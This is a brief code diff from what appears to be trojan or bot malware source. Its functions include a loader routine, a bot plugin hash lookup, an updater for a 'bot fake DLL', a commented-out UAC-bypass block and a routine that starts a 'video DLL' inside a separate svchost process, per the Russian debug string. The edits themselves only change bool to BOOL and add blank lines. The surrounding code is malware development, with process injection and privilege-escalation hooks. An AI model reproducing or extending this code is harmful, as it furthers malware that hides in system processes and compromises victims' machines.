@@ -69,7 +69,7 @@ DWORD GetHashFileNameBotPlug();
 
 DWORD WINAPI LoaderRoutine(LPVOID Data);
 
-bool RunLoaderRoutine()
+BOOL RunLoaderRoutine()
 {
 /*
 #ifdef UAC_bypassH
@@ -82,11 +82,13 @@ bool RunLoaderRoutine()
 //#endif
 }
 
-bool RunVideoProcess()
+BOOL RunVideoProcess()
 {
 	DLLDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
 	return MegaJump( VideoProcess::StartSvchost );
 }
+
+
 
 DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
@@ -367,6 +369,7 @@ bool UpdateBotFakeDll( BYTE* data, int c_data )
 		return true;
 	return false;
 }
+
 
 DWORD GetHashFileNameBotPlug()
 {
